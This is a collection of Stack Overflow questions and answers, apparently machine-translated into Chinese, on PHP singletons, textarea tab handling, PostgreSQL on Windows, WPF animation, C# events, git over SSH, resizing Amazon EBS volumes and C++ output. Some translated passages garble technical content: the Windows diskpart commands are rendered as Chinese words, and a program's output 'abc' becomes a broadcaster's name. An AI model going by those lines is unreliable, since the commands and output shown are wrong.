  private function __construct() {}

  public static function getInstance()
  { 
    if(self::$instance === false)
    { 
      self::$instance = memcache_connect(); 
    } 

    return self::$instance; 
  } 
} 
```

和用法——

```
$mc = MemCache::getInstance();
memcache_get($mc, ...)
... 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T11:36:31.670

传入 MC 实例：

```
class abc
{
    function __construct($mc) {
        $this->mc = $mc;
    }
}    
class def
{
    function __construct($mc) {
        $this->mc = $mc;
    }
}

$mc = new cache_class;
$abc = new abc($mc); 
```

等等

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T11:45:36.470

我想你在这里寻找静态属性。

```
class mc {
    private static $instance;

    public static function getInstance() {
        if (self::$instance== null) {
            self::$instance= new self;
        }
        return self::$instance;
    }

    private function __construct() {
        $this->mem = memcache_connect(...);
    }
} 
```

这实现了一个基本的单例模式。而不是构造对象调用`mc::getInstance()`。看看[单身人士](http://uk.php.net/manual/en/language.oop5.patterns.php)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-10T05:14:41.690

您应该使用依赖注入。单例模式和静态结构被认为是不好的做法，因为它们本质上是全局的（并且有充分的理由——它们使您能够使用您实例化的任何类而不是其他类）。

为了便于维护，您应该执行以下操作。

```
class MemCache {
    protected $memcache;

    public function __construct(){
        $this->memcache = memcache_connect();
    }
}

class Client {
    protected $MemCache;

    public function __construct( MemCache $MemCache ){
        $this->MemCache = $MemCache;
    }

    public function getMemCache(){
        return $this->MemCache;
    }
}

$MemCache = new MemCache();
$Client = new Client($MemCache);
$MemCache1 = $Client->getMemCache();

// $MemCache and $MemCache1 are the same object. 
// memcache_connect() has not been called more than once. 
```

# html - 文本框中的选项卡

> ID：550756
> 
> 赞同：4
> 
> 时间：2009-02-15T11:34:58.820
> 
> 标签：html, user-interface

如何制作一个允许用户输入选项卡的文本框，并且在按下选项卡按钮时不将用户发送到下一个元素？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-15T11:47:46.010

您只需要`onkeydown`通过`event.keyCode === 9`. 将字符插入文本区域并非易事 - 使用库或谷歌搜索“insertatcaret”。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T11:45:15.143

[已经有一些jQuery](http://jquery.com/)插件可以做到这一点。一个例子是[Tabby](http://plugins.jquery.com/project/TextareaTabs)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T11:37:09.470

您可以使用 JavaScript 来捕获 tab keypress 事件并将其替换为空格（我不确定是否将制表符插入到 textarea 中）。

*E：* [这个页面](http://ask.metafilter.com/36874/Preexisting-JavaScript-for-using-tab-to-indent-textarea-contents) *看起来*不错。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T11:49:27.990

```
<textarea onkeydown="return catchTab(this, event);">

```

JS代码：

```
 function setSelectionRange(input, selectionStart, selectionEnd) {
    if (input.setSelectionRange) {
        input.focus();
        input.setSelectionRange(selectionStart, selectionEnd);
    }
    else if (input.createTextRange) {
        var range = input.createTextRange();
        range.collapse(true);
        range.moveEnd('character', selectionEnd);
        range.moveStart('character', selectionStart);
        range.select();
    }
}

function replaceSelection (input, replaceString) {
    if (input.setSelectionRange) {
        var selectionStart = input.selectionStart;
        var selectionEnd = input.selectionEnd;
        input.value = input.value.substring(0, selectionStart)+ replaceString + input.value.substring(selectionEnd);
        if (selectionStart != selectionEnd){
            setSelectionRange(input, selectionStart, selectionStart +   replaceString.length);
        } else{
            setSelectionRange(input, selectionStart + replaceString.length, selectionStart + replaceString.length);
        }
    } else if (document.selection) {
        var range = document.selection.createRange();
        if (range.parentElement() == input) {
            var isCollapsed = range.text == '';
            range.text = replaceString;
             if (!isCollapsed)  {
                range.moveStart('character', -replaceString.length);
                range.select();
            }
        }
    }
}

function catchTab(item,e){
    if(navigator.userAgent.match("Gecko")){
        c=e.which;
    } else{
        c=e.keyCode;
    }
    if(c==9){
        replaceSelection(item, "\t");
        setTimeout(function() { item.focus() } , 0);
        return false;
    }
} 

```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T11:44:59.997

onkeypress、onkeyup 或 onkeydown 检查按下的键，如果它是选项卡，则将 \t 附加到文本框并返回 false，以便焦点保持在文本框上，您很可能必须使用文本范围，以便可以在任何地方插入选项卡在文本的末尾，其余的谷歌是你的朋友的基本想法:)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T14:20:45.643

**不要**尝试在**IE**中捕获“TAB”键的**onkeypress**事件（***它不起作用***）（[错误 249](http://webbugtrack.blogspot.com/2008/07/bug-249-you-cant-press-tab-in-ie-and.html)）

 ***请尝试使用 onkeydown 或 onkeyup。

# windows - 在 Windows 上安装 PostgreSQL

> ID：550758
> 
> 赞同：4
> 
> 时间：2009-02-15T11:36:10.983
> 
> 标签：windows, postgresql, user-accounts

我这里有点乱。几天前，我在我的 Vista 计算机上安装了 PostgreSQL，但是当被要求输入 postgre 用户帐户的密码时，我不记得了（据称我在安装过程中被问到，但我不记得了）。

无论如何，所以我卸载了 Pg 并打算重新安装它，删除了用户帐户，它是 /Users/ 目录，它是特殊权限（“高级用户配置文件属性”）但是当我开始安装 Pg 时，它似乎认为该帐户仍然存在当我在设置过程中提供密码时，它说它不是正确的密码 - 这意味着该帐户仍然存在于某处。

无论如何我可以恢复这个吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T12:05:06.530

转到控制面板-> 管理工具-> 计算机管理。在“本地用户和组”下，您可以看到为您的系统创建的所有用户。删除“postgres”并重新安装 PostgreSQL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-07-24T16:04:19.033

以管理员权限打开命令提示符。即右键单击命令提示符图标-> 以管理员身份运行

使用以下命令更改密码：

!important: 案例并且应该以管理员身份运行

```
NET USER postgres <NEW_PASSWORD> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-04-06T09:22:24.490

在 Vista 上，您可以转到控制面板 -> 用户帐户 -> 管理其他帐户，然后选择用户 postgres，如果您忘记了最后一个密码，请更改密码。

# c# - WPF：移动速度（平移）随距离而变化

> ID：550778
> 
> 赞同：1
> 
> 时间：2009-02-15T11:57:34.473
> 
> 标签：c#, wpf, math, canvas, physics

*参考我目前正在构建的[这个编程游戏。](https://stackoverflow.com/questions/505040/developing-a-robocode-type-game-with-net-for-a-school-assignment)*

我编写了以下方法来将画布移动（平移）到特定距离并根据其当前角度：

```
private void MoveBot(double pix, MoveDirection dir)
    {
        if (dir == MoveDirection.Forward)
        {
            Animator_Body_X.To = Math.Sin(HeadingRadians) * pix;
            Animator_Body_Y.To = ((Math.Cos(HeadingRadians) * pix) * -1);
        }
        else
        {
            Animator_Body_X.To = ((Math.Sin(HeadingRadians) * pix) * -1);
            Animator_Body_Y.To = Math.Cos(HeadingRadians) * pix;
        }

        Animator_Body_X.To += Translate_Body.X;
        Animator_Body_Y.To += Translate_Body.Y;

        Animator_Body_X.From = Translate_Body.X;
        Translate_Body.BeginAnimation(TranslateTransform.XProperty, Animator_Body_X);

        Animator_Body_Y.From = Translate_Body.Y;
        Translate_Body.BeginAnimation(TranslateTransform.YProperty, Animator_Body_Y);

        TriggerCallback();
    } 
```

它接受的参数之一是平移时应覆盖的像素数。

关于上面的代码，`Animator_Body_X`和`Animator_Body_Y`是 类型`DoubleAnimation`，然后应用于机器人的`TranslateTransform`对象：`Translate_Body`

* * *

我面临的问题是机器人（它是一个画布）根据输入的距离以不同的速度移动。因此，距离越远，机器人移动的越快！换个角度来看，如果输入的距离是`20`，机器人移动得相当慢，但如果输入的距离是`800`，它就会从屏幕上射出。

**我需要使这个速度恒定，与输入的距离无关。**

我想我需要根据输入的距离调整一些`Animator_Body_X`和`Animator_Body_Y`属性，但我不知道要准确调整什么（我认为一些数学也必须完成）。

以下是您可能想要查看的[属性](http://msdn.microsoft.com/en-us/library/system.windows.media.animation.doubleanimation_properties.aspx)[列表以解决此问题。`DoubleAnimation`](http://msdn.microsoft.com/en-us/library/system.windows.media.animation.doubleanimation_properties.aspx)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T12:09:18.957

你有理由使用 DoubleAnimation 吗？DoubleAnimation 旨在根据需要在特定时间段的开始/结束时使用线性插值加速/减速在特定时间段内从 A 到 B 取值（这就是为什么它对于更长的距离“更快”.. 它还有更远的路要走在同一时间！）。从外观上看，您尝试做的是根据它所面对的方向在每个“帧”移动固定距离的东西？这似乎不适合我。

您可以根据距离计算动画的长度，因此距离越长，长度越长，然后项目始终以相同的“速度”移动。对我来说，自己移动项目更有意义。您可以根据角度标准计算对象速度，然后每个“帧”都可以根据该速度手动移动项目所需的距离。使用这种方法，如果需要，您还可以轻松地对速度施加摩擦等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-16T09:34:42.657

你必须做的数学是：速度*时间=距离

因此，要保持速度恒定，您必须更改动画的持续时间：

```
double pixelsPerSecond = 5;
animation.Duration = TimeSpan.FromSeconds(distance/pixelsPerSecond); 
```

顺便说一句，我不认为动画是移动机器人的最佳解决方案。

# c# - C#: events or an observer interface? Pros/cons?

> ID：550785
> 
> 赞同：69
> 
> 时间：2009-02-15T12:10:39.733
> 
> 标签：c#, events, observer-pattern

I've got the following (simplified):

```
interface IFindFilesObserver
{
    void OnFoundFile(FileInfo fileInfo);
    void OnFoundDirectory(DirectoryInfo directoryInfo);
}

class FindFiles
{
    IFindFilesObserver _observer;

    // ...
} 
```

...and I'm conflicted. This is basically what I would have written in C++, but C# has events. Should I change the code to use events, or should I leave it alone?

What are the advantages or disadvantages of events over a traditional observer interface?

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2009-02-15T12:35:16.227

Consider an event to be a callback interface where the interface has only one method.

**Only hook events you need**
With events, you only need to implement handlers for events you're interested in handling. In the observer interface pattern, you'd have to implement all methods in the entire interface including implementing method bodies for notification types you don't actually care about handling. In your example, you always have to implement OnFoundDirectory and OnFoundFile, even if you only care about one of these events.

**Less maintenance**
Another good thing about events is you can add a new one to a particular class so that it will raise it, and you don't have to change every existing observer. Whereas if you want to add a new method to an interface, you have to go around every class that already implements that interface and implement the new method in all of them. With an event though, you only need to alter existing classes that actually want to do something in response to the new event you're adding.

**The pattern is built into the language so everybody knows how to use it**
Events are idiomatic, in that when you see an event, you know how to use it. With an observer interface, people often implement different ways of registering to receive notifications and hook up the observer.. with events though, once you've learnt how to register and use one (with the += operator), the rest are all the same.

**Pros for interfaces**
I haven't got many pros for interfaces. I guess they force someone to implement all methods in the interface. But, you can't really force somebody to implement all those methods correctly, so I don't think there's a lot of value on this.

**Syntax**
Some people don't like the way you have to declare a delegate type for each event. Also, standard event handlers in the .NET framework have these parameters: (object sender, EventArgs args). As sender doesn't specify a particular type, you have to down-cast if you want to use it. This often is fine in practice, it feels not quite right though because you're losing the protection of the static type system. But, if you implement your own events and don't follow the .NET framework convention on this, you can use the correct type so potential down-casting isn't required.

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2009-02-15T12:14:45.057

Hmm, events can be used to implement the Observer pattern. In fact, using events can be regarded as another implementation of the observer-pattern imho.

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-03-27T08:12:20.940

*   Events are harder to propagate through chain of objects, for example if you use FACADE pattern or delegate work to other class.
*   You need to be very careful with unsubscribing from events to allow object to be garbage collected.
*   Events are 2x time slower than simple function call, 3x slower if you do null check on every raise, and copy event delegate before null check and invocation to make it thread safe.

*   Also [read MSDN about new (in 4.0) `IObserver<T>` interface.](http://msdn.microsoft.com/en-us/library/dd783449.aspx)

Consider this example:

```
using System;

namespace Example
{
    //Observer
    public class SomeFacade
    {
        public void DoSomeWork(IObserver notificationObject)
        {
            Worker worker = new Worker(notificationObject);
            worker.DoWork();
        }
    }
    public class Worker
    {
        private readonly IObserver _notificationObject;
        public Worker(IObserver notificationObject)
        {
            _notificationObject = notificationObject;
        }
        public void DoWork()
        {
            //...
            _notificationObject.Progress(100);
            _notificationObject.Done();
        }
    }
    public interface IObserver
    {
        void Done();
        void Progress(int amount);
    }

    //Events
    public class SomeFacadeWithEvents
    {
        public event Action Done;
        public event Action<int> Progress;

        private void RaiseDone()
        {
            if (Done != null) Done();
        }
        private void RaiseProgress(int amount)
        {
            if (Progress != null) Progress(amount);
        }

        public void DoSomeWork()
        {
            WorkerWithEvents worker = new WorkerWithEvents();
            worker.Done += RaiseDone;
            worker.Progress += RaiseProgress;
            worker.DoWork();
            //Also we neede to unsubscribe...
            worker.Done -= RaiseDone;
            worker.Progress -= RaiseProgress;
        }
    }
    public class WorkerWithEvents
    {
        public event Action Done;
        public event Action<int> Progress;

        public void DoWork()
        {
            //...
            Progress(100);
            Done();
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-02-15T12:40:48.163

Pros of an interface-solution:

*   If you add methods, existing observers needs to implement those methods. This means that you have less of a chance of forgetting to wire up existing observers to new functionality. You can of course implement them as empty methods which means you have the luxury of still doing nothing in response to certain "events". But you won't so easily forget.
*   If you use explicit implementation, you'll also get compiler errors the other way, if you remove or change existing interfaces, then observers implementing them will stop compiling.

Cons:

*   More thought has to go into planning, since a change in the observer interface might enforce changes all over your solution, which might require different planning. Since a simple event is optional, little or no other code has to change unless that other code should react to the event.

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2009-02-15T19:14:47.607

Some further benefits of events.

*   You get proper multicast behaviour for free.
*   If you change the subscribers of an event in response to that event the behaviour is well defined
*   They can be introspected (reflected) easily and consistently
*   Tool chain support for events (simply because they are the idiom in .net)
*   You get the option to use the asynchronous apis it provides

You can achieve all of these (except the tool chain) yourself but it's surprisingly hard. For example: If you use a member variable like a List<> to store the list of observers. If you use foreach to iterate over it then any attempt to add or remove a subscriber within one of the OnFoo() method callbacks will trigger an exception unless you write further code to deal with it cleanly.

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-15T12:18:35.220

Pros are that events are more 'dot-netty'. If you are designing non-visual components that can be dropped onto a form, you can hook them up using the designer.

Cons are that an event only signifies a single event - you need a separate event for each 'thing' that you want to notify the observer about. This doesn't really have much practical impact except that each observed object would need to hold a reference for every observer for every event, bloating memory in the case where there are lots of observed objects (one of the reasons they made a different way of managing the observer/observable relationship in WPF).

In your case I'd argue it doesn't make much difference. If the observer would typically be interested in all those events, use an observer interface rather than separate events.

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-02-15T17:05:31.380

The best way to decide is this: which one suits the situation better. That might sound like a silly or unhelpful answer, but I don't think you should regard one or the other as the "proper" solution.

We can throw a hundred tips at you. Events are best when the observer is expected to listen for arbitrary events. An interface is best when the observer is expected to listed to all of a given set of events. Events are best when dealing with GUI apps. Interfaces consume less memory (a single pointer for multiple events). Yadda yadda yadda. A bulleted list of pros and cons is something to think about, but not a definitive answer. What you really need to do is try both of them in actual applications and get a good feel for them. Then you can choose the one that suits the situation better. Learn form doing.

If you have to use a single defining question, then ask yourself which better describes your situation: A set of loosely related events any of which may be used or ignored, or a set of closely related events which will all generally need to be handled by one observer. But then, I'm just describing the event model and interface model, so I'm back at square one: which one suits the situation better?

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-15T14:32:50.840

I prefer an event base solution for the following reasons

*   It reduces the cost of entry. It's much easier to say "+= new EventHandler" than to implement a full fledged interface.
*   It reduces maintenance costs. If you add a new event into your class that's all that needs to be done. If you add a new event to an interface you must update every single consumer in your code base. Or define an entirely new interface which over time gets annoying to consumers "Do I implement IRandomEvent2 or IRandomEvent5?"
*   Events allow for handlers to be non-class based (ie a static method somewhere). There is no functional reason to force all event handlers to be an instance member
*   Grouping a bunch of events into an interface is making an assumption about how the events are used (and it's just that, an assumption)
*   Interfaces offer no real advantage over a raw event.

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-02-15T14:36:27.387

Java has language support for anonymous interfaces, so callback interfaces are the thing to use in Java.

C# has support for anonymous delegates - lambdas - and so events are the thing to use in C#.

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2010-10-27T11:49:11.920

A benefit of interfaces is that they are easier to apply decorators to. The standard example:

```
subject.RegisterObserver(new LoggingObserver(myRealObserver)); 
```

compared to:

```
subject.AnEvent += (sender, args) => { LogTheEvent(); realEventHandler(sender, args); }; 
```

(I'm a big fan of the decorator pattern).

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2011-03-17T17:09:21.883

If your objects will need to be serialized in some way that retains references such as with [NetDataContractSerializer](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.netdatacontractserializer.aspx) or perhaps [protobuf](http://code.google.com/p/protobuf-net/) events will not be able to cross the serialization boundary. Since observer pattern relies on nothing more than just object references, it can work with this type of serialization with no problem if that is what is desired.

Ex. You have a bunch of business objects that link to each other bidirectionally that you need to pass to a web service.

# git - 无法通过 SSH 获取 git

> ID：550787
> 
> 赞同：9
> 
> 时间：2009-02-15T12:14:29.053
> 
> 标签：git, version-control, ssh

我已经设置了一个远程服务器的 git 存储库。现在我正在尝试通过以下方式结帐：

```
git fetch ssh://username@url.com/~username/workfolder/ 
```

但我收到一个错误：

```
fatal: Not a git repository 
```

我究竟做错了什么？难道是服务器不支持Git+SSH？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-15T12:25:59.960

尝试

```
git clone ssh://username@url.com/~username/workfolder/ 
```

这将在您的本地计算机上创建存储库。您对该分支所做的任何提交都将发送到您的本地存储库，当您想要推送回远程服务器时，您可以运行：

```
git push ssh://username@url.com/~username/workfolder/ 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T13:53:13.323

`git fetch`失败，因为它希望从现有的 git 存储库中运行。正如 Andy Hume 所说，您必须首先`git clone`创建现有 repo 的本地副本。

此外，它定义了一个[git 远程](http://www.kernel.org/pub/software/scm/git/docs/git-remote.html)调用`origin`，它设置为您从中克隆的 URL。这是您在本地存储库中键入`git fetch`或`git pull`检索新提交时使用的默认远程位置，也是您`git push`将新本地提交推送到远程存储库时的默认目的地。如果您从那里克隆，则不需要包含`ssh://username@url.com/~username/workfolder/`在您的推送命令中。

以下是一些其他有用的参考资料，来自[http://gitready.com/](http://gitready.com/)：

*   [推拉](http://gitready.com/beginner/2009/01/21/pushing-and-pulling.html)
*   [仅推送到裸存储库](http://gitready.com/advanced/2009/02/01/push-to-only-bare-repositories.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-05-07T02:30:26.480

可能是波浪号 ~ 试试：ssh://username@url.com/username/workfolder

# amazon-web-services - 不断增长的 Amazon EBS 卷大小

> ID：550790
> 
> 赞同：154
> 
> 时间：2009-02-15T12:16:12.387
> 
> 标签：amazon-web-services, amazon-ebs

Amazon 的 EC2 和 EBS 服务给我留下了深刻的印象。我想知道是否可以增加 EBS 卷。

例如：如果我有一个 50 GB 的卷并且我开始用完空间，我可以在需要时将它增加到 100 GB 吗？

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2009-02-15T12:40:08.350

您可以增加存储空间，但不能即时完成。您需要拍摄当前块的快照，添加一个新的更大的块并重新附加您的快照。

[这里](http://blog.edoceo.com/2009/02/amazon-ebs-how-to-grow-storage.html)有一个基于使用[Amazon 的 EC2 命令行工具](http://docs.amazonwebservices.com/AWSEC2/2009-11-30/CommandLineReference/)的简单演练

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2009-02-15T12:37:38.527

如果需要，您不能简单地即时“增加”更多空间，但您可以使用快照调整分区大小。

这样做的步骤：

1.  卸载 ebs 卷
2.  创建一个 ebs 快照
3.  添加具有更多空间的新卷
4.  重新创建分区表并调整文件系统大小
5.  挂载新的 ebs 卷

查看[http://aws.amazon.com/ebs/](http://aws.amazon.com/ebs/) - EBS 快照：

> 快照还可用于实例化多个新卷、扩展卷大小或跨可用区移动卷。创建新卷时，可以选择基于现有 Amazon S3 快照创建它。在这种情况下，新卷作为原始卷的精确副本开始。通过选择性地指定不同的卷大小或不同的可用区，此功能可用作增加现有卷大小或在新可用区中创建重复卷的一种方式。如果您选择使用快照来调整卷大小，则需要确保您的文件系统或应用程序支持调整设备大小。

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2012-07-19T20:37:29.087

我遵循了所有的答案，所有的东西都遗漏了一些东西。

如果您按照这些步骤操作，您可以增加 EBS 卷并保留您的数据（这不适用于根卷）。为简单起见，我建议使用 AWS 控制台创建快照，...您也可以使用 AWS 命令​​行工具来执行此操作。

我们在这里没有触及根卷。

转到您的 AWS 控制台：

1.  关闭您的实例（仅几分钟）
2.  分离您计划增长的卷（例如 /dev/xvdf）
3.  创建卷的快照。
4.  使用您刚刚创建的快照创建一个更大的新卷
5.  将新卷附加到您的实例
6.  启动您的实例

SSH 到您的实例：

```
 $ sudo fdisk -l 
```

这给了你类似的东西：

```
Disk /dev/xvdf: 21.5 GB, 21474836480 bytes
12 heads, 7 sectors/track, 499321 cylinders, total 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0xd3a8abe4

    Device Boot      Start         End      Blocks   Id  System
/dev/xvdf1            2048    41943039    20970496   83  Linux 
```

记下**Start**和**Id**值。（在本例中为 2048 和 83）

使用 fdisk 删除分区 xvdf1 并创建一个新分区，该分区正好从同一块 (2048) 开始。我们将给它相同的 ID (83)：

```
$ sudo fdisk /dev/xvdf 

Command (m for help): d
Selected partition 1

Command (m for help): n
Partition type:
   p   primary (0 primary, 0 extended, 4 free)
   e   extended
Select (default p): p
Partition number (1-4, default 1): 
Using default value 1
First sector (2048-41943039, default 2048): 
Using default value 2048
Last sector, +sectors or +size{K,M,G} (2048-41943039, default 41943039): 
Using default value 41943039

Command (m for help): t
Selected partition 1
Hex code (type L to list codes): 83

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.
Syncing disks. 
```

这一步在这里解释得很好：http: [//litwol.com/content/fdisk-resizegrow-physical-partition-without-losing-data-linodecom](http://litwol.com/content/fdisk-resizegrow-physical-partition-without-losing-data-linodecom)

几乎完成了，我们只需要挂载卷并运行 resize2fs：

挂载 ebs 卷：（我的是 /mnt/ebs1）

```
$ sudo mount /dev/xvdf1 /mnt/ebs1 
```

并调整它的大小：

```
$ sudo resize2fs -p /dev/xvdf1

resize2fs 1.42 (29-Nov-2011)
Filesystem at /dev/xvdf1 is mounted on /mnt/ebs1; on-line resizing required
old_desc_blocks = 1, new_desc_blocks = 2
Performing an on-line resize of /dev/xvdf1 to 5242624 (4k) blocks.
The filesystem on /dev/xvdf1 is now 5242624 blocks long.

ubuntu@ip-xxxxxxx:~$ 
```

完毕！用于`df -h`验证新尺寸。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2010-04-28T14:17:25.117

只要您可以接受几分钟的停机时间，Eric Hammond 就在运行的 EBS 实例上调整根磁盘的大小写了一篇很好的文章：http: [//alestic.com/2010/02/ec2-resize-running-ebs -根](http://alestic.com/2010/02/ec2-resize-running-ebs-root)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2013-03-05T16:48:09.957

所有很棒的建议，我想我会添加我找到的这篇文章，它涉及使用 Amazon Web UI 工具扩展 Windows Amazon EC2 EBS 实例以执行必要的更改。如果您不习惯使用 CLI，这将使您的升级更容易。

[http://www.tekgoblin.com/2012/08/27/aws-guides-how-to-resize-a-ec2-windows-ebs-volume/](http://www.tekgoblin.com/2012/08/27/aws-guides-how-to-resize-a-ec2-windows-ebs-volume/)

感谢 TekGoblin 发布这篇文章。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2011-04-05T09:57:02.303

您现在可以通过 AWS 管理控制台执行此操作。该过程与其他答案相同，但您不再需要转到命令行。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2011-05-20T16:32:55.643

顺便说一句：与物理磁盘一样，使用 LVM 可能很方便；前任：

[http://www.davelachapelle.ca/guides/ubuntu-lvm-guide/](http://www.davelachapelle.ca/guides/ubuntu-lvm-guide/) http://www.centos.org/docs/5/html/Cluster_Logical_Volume_Manager/

最大的优势：它允许动态添加（或删除）空间。

它也可以很容易地在实例之间/之间移动。

注意事项：

*   必须提前配置
*   一个简单的 JBOD 设置意味着如果丢失一个“磁盘”，您将失去一切

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2012-07-12T21:44:09.990

我的步骤：

1.  停止实例
2.  找到附加到实例的 ebs 卷并创建它的快照
3.  使用上述快照创建具有更大磁盘空间的新卷。不幸的是，aws 控制台上用于创建快照的 UI 几乎无法使用，因为它列出了 aws 上的所有快照。使用命令行工具要容易得多，如下所示：

    ```
    ec2-create-volume -s 100 --snapshot snap-a31fage -z us-east-1c 
    ```

4.  从实例中分离现有的 ebs（较小）卷

5.  将新的（更大的）卷附加到实例，并确保将其附加到实例所期望的同一设备（在我的情况下是 /dev/sda1）
6.  启动实例

你完成了！

除了上述第 3 步之外，您还可以使用 aws 管理控制台执行所有操作。

还要注意这里提到的：

[https://serverfault.com/questions/365605/how-do-i-access-the-attached-volume-in-amazon-ec2](https://serverfault.com/questions/365605/how-do-i-access-the-attached-volume-in-amazon-ec2)

您的 ec2 实例上的设备可能是 /dev/xv*，而 aws Web 控制台告诉您它是 /dev/s*。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2011-02-14T10:40:47.513

对 Windows 操作系统使用命令“diskpart”，看看这里：使用[http://support.microsoft.com/kb/300415](http://support.microsoft.com/kb/300415) 以下是我对非根磁盘（基本不是动态磁盘）所遵循的步骤

拍摄快照后，卸载旧的 EBS 卷（例如 600GB）并创建更大的 EBS 卷（例如 1TB）并安装这个新的 EBS 卷 - 您必须让 Windows 知道调整大小（从 600GB 到 1TB）所以在命令提示符下（以管理员身份运行）

> 磁盘部分.exe
> 
> 选择磁盘=9
> 
> 选择音量=Z
> 
> 延长

[我的磁盘 9，卷标为 Z，是一个大小为 1TB 的卷，它是从大小为 600GB 的 ec2 快照创建的 - 我想将 600GB 的大小调整为 1TB，因此可以按照上述步骤执行此操作。]

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-06-22T09:01:13.927

如果您的操作系统支持，我强烈建议将逻辑卷管理器 (LVM) 用于所有 EBS 卷。Linux 发行版通常会这样做。这很棒有几个原因。

1.  可以实时调整逻辑卷的大小和移动，因此您可以添加创建另一个更大的 EBS 卷，将其作为物理卷 (PV) 添加到 LVM 池中，而不是需要停机的整个离线快照操作，然后移动逻辑卷 (LV)，从池中删除旧的物理卷，并删除旧的 EBS 卷。然后，您只需调整逻辑卷的大小，并调整其上的文件系统的大小。这根本不需要停机！

2.  它将您的存储从您的“物理”设备中抽象出来。无需停机或更改挂载点/fstab 即可跨设备移动分区非常方便。

如果 Amazon 能够即时调整 EBS 卷的大小，那就太好了，但对于 LVM，就没有那么必要了。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-02-04T08:08:33.977

如果您的根卷是 xfs 文件系统，则运行此命令 xfs_growfs /

# c++ - 有没有更好的方法来打印一个最多包含 N 个字符的字符串？

> ID：550797
> 
> 赞同：7
> 
> 时间：2009-02-15T12:19:24.517
> 
> 标签：c++, vector

-edit- 我发送的是二进制而不是字符串。我的测试使用的是 html 页面，所以在这个例子中我只使用了一个字符串，但我的问题是关于二进制、向量和使用 ostream 进行调试。我这样做消除了一些混乱。

我有以下代码：

```
cout << string(&v[0]).substr(0, len); 
```

有没有更好的方法来打印cout 长度为*len的字符串**v*？我想过做 v[len] = 0 但我抛出一个大小为 1 的断言。我的代码是：

 *```
vector<char> v;
v.reserve(1024*16); //required
v.resize(1); //so we can do &v[0]
recv(sockfd, &v[0], v.capacity(), 0);
while (l > 0)
{
    cout << string(&v[0]).substr(0, l);
    recv(sockfd, &v[0], v.capacity(), 0);
}
cout << "the size is " << v.size(); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T17:24:52.550

您可以在 cout 对象上使用 ostream::write 方法：

```
#include <iostream>
#include <vector>

using namespace std;

int main()
{
  vector<char> test;
  test.push_back('a');
  test.push_back('b');
  test.push_back('c');

  cout.write(&test[0], 3);
  cout << endl;
} 
```

输出：

> 美国广播公司

由于 ostream::write 返回一个包含 *this 的 ostream&，你甚至可以这样做

```
cout.write(&test[0], 3) << endl; 
```

但我不确定这实际上是否更好（或更清晰）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-15T12:54:42.153

```
vector<char> v;
v.reserve(1024*16); //required
v.resize(1); //so we can do &v[0]
recv(sockfd, &v[0], v.capacity(), 0); 
```

该代码有一个错误。调用`reserve`只会保证您可以 push_back 至少那么多元素，直到对向量的引用和迭代器再次失效（通过可能重新分配已用缓冲区）。它*不允许*您写入 v[0..1024*16-1]，就像您使用`recv`. 你所要做的

```
v.resize(1024*16); //required 
```

实际上有那么多元素可用并且实际上通过`v.size()`而不是`v.capacity()`.

对于您的子字符串操作，我可能会这样做

```
std::string str(&v[0], n);
std::cout << str; 
```

其中 n 的范围从 0 到 v.size()。您可以`std::min(n, v.size())`用来保证，如果 n 在您的情况下可能更大并且您需要一个上限。

（在一个侧节点上，我会避免在那里有一个名为“l”（ell）的变量，因为它看起来非常像一个“1”（一个），这会让人们感到困惑）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T17:22:26.393

为什么将大小设置为 1？
当您保留空间时，该空间可用于向量增长（无需重新分配）。但是谁说直接使用就安全了？我已经看到（调试）实现在 size() 修改这些位之后添加一个警告缓冲区，并且它会在下次检查时生成一个断言。您应该只从 0 -> size() 读取/写入。

注意这也将允许您使用 v[len] = '\0';

```
vector<char> v(1024*16);

std::size_t  len = recv(sockfd, &v[0], v.size(), 0);
while (len > 0)
{
    v[len] = '\0';
    cout << &v[0];
    len = recv(sockfd, &v[0], v.size(), 0);
} 
```

